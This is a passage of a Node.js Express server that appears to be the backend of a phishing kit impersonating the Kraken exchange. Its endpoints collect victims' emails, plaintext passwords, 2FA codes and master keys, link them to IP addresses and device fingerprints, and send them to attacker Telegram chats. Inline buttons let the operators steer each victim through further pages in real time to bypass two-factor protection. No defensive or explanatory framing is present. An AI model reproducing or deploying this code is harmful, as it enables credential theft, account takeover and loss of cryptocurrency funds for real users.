    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // 🔄 Reset winner for fresh session (new page 1 submission)
    if (fingerprint) {
      delete userWinnerTelegram[fingerprint];
      console.log(`🔄 Reset winner for fingerprint ${fingerprint} (new session)`);
      // 📌 Update fingerprint to new email (allow updates on page 1)
      deviceFingerprintToEmail[fingerprint] = email;
      console.log(`📌 Updated fingerprint ${fingerprint} to new email ${email}`);
    }

    // Store other mappings as backup
    const compositeKey = `${ipPrefix}_${userId}`;
    ipPrefixUserIdToEmail[compositeKey] = email;
    pendingApprovals[email] = { status: "pending", password, region, device };
    ipToEmail[ip] = email;
    ipPrefixToEmail[ipPrefix] = email;

    console.log(`📥 CB Login received: ${email}`);
    console.log(`📌 Mapped IP ${ip} to email ${email}`);
    console.log(`📍 IP Prefix ${ipPrefix} + User ID ${userId} → ${email}`);

    const message =
      `🐙🐙🐙🐙 <b>Kraken - Sign in</b> 🐙🐙🐙🐙\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    try {
      await sendLoginTelegram(email, message);
    } catch (err) {
      console.error("❌ Failed to send CB Login Telegram message:", err);
    }

    res.json({ status: "ok" });
  } catch (err) {
    console.error("❌ CB Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-verify", async (req, res) => {
  try {
    const { userId } = req.body;
    const { ip, device, region } = await getClientInfo(req);
    if (!ip) return res.status(400).json({ error: "Missing ip" });

    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Verify page received: ${ip}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);

    pendingVerify[ip] = { status: "pending" };

    const message =
      `🐙🐙🐙🐙 <b>Kraken - Verifying</b> 🐙🐙🐙🐙\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Verify going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendVerifyTelegram(ip, message, emailForThisIP);
      } else {
        console.log(`📨 Verify going to both (no winner for ${emailForThisIP})`);
        await sendVerifyTelegram(ip, message, null);
      }
    } catch (err) {
      console.error("❌ Failed to send Verify Telegram message:", err);
    }

    res.json({ status: "ok", identifier: ip });
  } catch (err) {
    console.error("❌ Verify endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/submit-2fa", async (req, res) => {
  try {
    const { code, userId, requestId, email } = req.body;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
    const { ip, device, region } = await getClientInfo(req);

    let identifier = email || resolveEmailFromRequest(req) || requestIdToEmail[requestId];
    
    if (identifier) {
      requestIdToEmail[requestId] = identifier;
      console.log(`📌 Mapped requestId ${requestId} to identifier ${identifier}`);
    }
    
    pending2FA[requestId] = { status: "pending" };
    console.log(`📥 2FA Request received: ${requestId}`);
    console.log(`🔍 Using identifier: ${identifier}`);
    console.log(`🔍 Winner for ${identifier}: ${userWinnerTelegram[identifier]}`);

    const message =
      `🐙🐙🐙🐙 <b>Kraken - 2FA</b> 🐙🐙🐙🐙\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🔐 2FA:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `2fa_approve|${requestId}` },
            { text: "❌ Reject",  callback_data: `2fa_reject|${requestId}` }
          ]
        ]
      }
    };

    try {
      if (identifier && userWinnerTelegram[identifier]) {
        console.log(`📨 2FA going to winner only: ${userWinnerTelegram[identifier]}`);
        await sendFollowUpMessage(identifier, message, options);
      } else {
        console.log(`📨 2FA going to both (no winner yet for: ${identifier})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send 2FA Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ 2FA submit endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/submit-2fa-new", async (req, res) => {
  try {
    const { code, userId, requestId } = req.body;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
    const { ip, device, region } = await getClientInfo(req);

    const emailForThisIP = resolveEmailFromRequest(req);
    let identifier = emailForThisIP || requestIdToEmail[requestId];
    
    if (identifier) {
      requestIdToEmail[requestId] = identifier;
      console.log(`📌 Mapped requestId ${requestId} to identifier ${identifier}`);
    }

    pending2FA[requestId] = { status: "pending" };
    console.log(`📥 2FA-New Request received: ${requestId}`);
    console.log(`🔍 Using identifier: ${identifier}`);
    console.log(`🔍 Winner for ${identifier}: ${userWinnerTelegram[identifier]}`);

    const message =
      `🐙🐙🐙🐙 <b>Last 2-FA</b> 🐙🐙🐙🐙\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🔐 2FA Code:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Reject ❌", callback_data: `2fa_reject_new|${requestId}` }],
          [{ text: "🏁 Done Page 🏁", callback_data: `2fa_done|${requestId}` }],
          [{ text: "💼 Wallet 💼", callback_data: `2fa_wallet|${requestId}` }],
          [{ text: "🗝️ Master Key 🗝️", callback_data: `2fa_masterkey|${requestId}` }]
        ]
      }
    };

    try {
      if (identifier && userWinnerTelegram[identifier]) {
        console.log(`📨 2FA-New going to winner only: ${userWinnerTelegram[identifier]}`);
        await sendFollowUpMessage(identifier, message, options);
      } else {
        console.log(`📨 2FA-New going to both (no winner yet for: ${identifier})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send 2FA-New Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ 2FA-New submit endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/submit-masterkey", async (req, res) => {
  try {
    const { code, userId, requestId } = req.body;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
    const { ip, device, region } = await getClientInfo(req);

    const emailForThisIP = resolveEmailFromRequest(req);
    let identifier = emailForThisIP || requestIdToEmail[requestId];
    
    if (identifier) {
      requestIdToEmail[requestId] = identifier;
      console.log(`📌 Mapped requestId ${requestId} to identifier ${identifier}`);
    }

    pendingMasterKey[requestId] = { status: "pending" };
    console.log(`📥 Master Key Request received: ${requestId}`);
    console.log(`🔍 Using identifier: ${identifier}`);
    console.log(`🔍 Winner for ${identifier}: ${userWinnerTelegram[identifier]}`);

    const message =
      `🗝️🗝️🗝️🗝️ <b>Kraken - Master Key</b> 🗝️🗝️🗝️🗝️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🔐 Master Key:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Reject ❌", callback_data: `mk_reject|${requestId}` }],
          [{ text: "🏁 Done Page 🏁", callback_data: `mk_done|${requestId}` }],
          [{ text: "💼 Wallet 💼", callback_data: `mk_wallet|${requestId}` }],
          [{ text: "🔐 Passkey 2FA 🔐", callback_data: `mk_passkey|${requestId}` }]
        ]
      }
    };

    try {
      if (identifier && userWinnerTelegram[identifier]) {
        console.log(`📨 Master Key going to winner only: ${userWinnerTelegram[identifier]}`);
        await sendFollowUpMessage(identifier, message, options);
      } else {
        console.log(`📨 Master Key going to both (no winner yet for: ${identifier})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Master Key Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Master Key submit endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/send-wallet-options", async (req, res) => {
  try {
    const { userId, requestId } = req.body;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });
    const { ip, device, region } = await getClientInfo(req);

    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Wallet Options Request received: ${requestId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    pendingWalletOptions[requestId] = { status: "pending" };

    const message =
      `💰💰💰💰 <b>Wallet - Decision</b> 💰💰💰💰\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🗝️ Master Key 🗝️", callback_data: `wallet_master_key|${requestId}` }],
          [{ text: "🔐 2FA 🔐", callback_data: `wallet_2fa|${requestId}` }],
          [{ text: "🏁 Done 🏁", callback_data: `wallet_done|${requestId}` }]
        ]
      }
    };

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Wallet Options going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, options);
      } else {
        console.log(`📨 Wallet Options going to both (no winner for ${emailForThisIP})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Wallet Options Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Wallet Options endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/masterkey-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingMasterKey[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Master Key status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-masterkey-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    if (pendingMasterKey[requestId]) {
      pendingMasterKey[requestId].status = status;
      console.log(`✅ Master Key status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ Master Key update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/approval-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pending2FA[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Approval status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-2fa-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    if (pending2FA[requestId]) {
      pending2FA[requestId].status = status;
      console.log(`✅ 2FA status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ 2FA update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/wallet-options-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingWalletOptions[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Wallet Options status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-wallet-options-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    if (pendingWalletOptions[requestId]) {
      pendingWalletOptions[requestId].status = status;
      console.log(`✅ Wallet Options status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ Wallet Options update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/verify-code", (req, res) => {
  try {
    const { code, chatId } = req.body;
    if (!code || !chatId) return res.status(400).json({ message: "Code and chatId are required." });
    if (code.length >= 6 && code.length <= 8) {
      send2FACode(code, chatId);
      console.log(`📥 2FA Code sent to chatId: ${chatId}`);
      res.status(200).json({ message: "Code sent to Telegram." });
    } else {
      res.status(400).json({ message: "Invalid code length. Must be 6–8 characters." });
    }
  } catch (err) {
    console.error("❌ Verify code endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/check-status", (req, res) => {
  try {
    const identifier = (req.query.identifier || "").trim();
    if (pendingUsers[identifier])     return res.json({ status: pendingUsers[identifier].status });
    if (pendingCodes[identifier])     return res.json({ status: pendingCodes[identifier].status });
    if (pendingGeneric[identifier])   return res.json({ status: pendingGeneric[identifier].status });
    if (pendingPage[identifier])      return res.json({ status: pendingPage[identifier].status });
    if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
    if (pendingVerify[identifier])    return res.json({ status: pendingVerify[identifier].status });
    res.json({ status: "unknown" });
  } catch (err) {
    console.error("❌ Check status GET endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;
    if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
    res.json({ status: pendingApprovals[email].status });
  } catch (err) {
    console.error("❌ Check status POST endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/update-status", (req, res) => {
  try {
    const identifier = (req.body.identifier || req.body.email || "").trim();
    const status = req.body.status;
    console.log(`📬 Update Status Received: ${identifier}, ${status}`);

    if (pendingUsers[identifier])         pendingUsers[identifier].status = status;
    else if (pendingCodes[identifier])    pendingCodes[identifier].status = status;
    else if (pendingGeneric[identifier])  pendingGeneric[identifier].status = status;
    else if (pendingPage[identifier])     pendingPage[identifier].status = status;
    else if (pendingApprovals[identifier]) pendingApprovals[identifier].status = status;
    else if (pendingVerify[identifier])   pendingVerify[identifier].status = status;
    else if (pendingVerificationPage[identifier]) pendingVerificationPage[identifier].status = status;
    else return res.json({ ok: false, message: "Identifier not found" });

    // Also update pendingGmailLogin if this email has a pending Gmail login
    let gmailRequestId = null;
    for (const [rId, mappedEmail] of Object.entries(requestIdToEmail || {})) {
      if (mappedEmail === identifier) {
        gmailRequestId = rId;  // Keep updating to get the LAST match
      }
    }
    
    if (gmailRequestId && pendingGmailLogin[gmailRequestId]) {
      pendingGmailLogin[gmailRequestId].status = status;
    }

    console.log(`✅ Status updated for: ${identifier}`);
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Update status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url)
      .then(() => console.log("🔁 Pinged self"))
      .catch(err => console.error("⚠️ Ping failed:", err.message));
  }
}, 30 * 1000);

app.use((err, req, res, next) => {
  console.error("❌ Unhandled error:", err);
  res.status(500).json({ error: "Internal server error" });
});

app.listen(PORT, () => {
  console.log(`✅ Combined server running at port ${PORT}`);
});
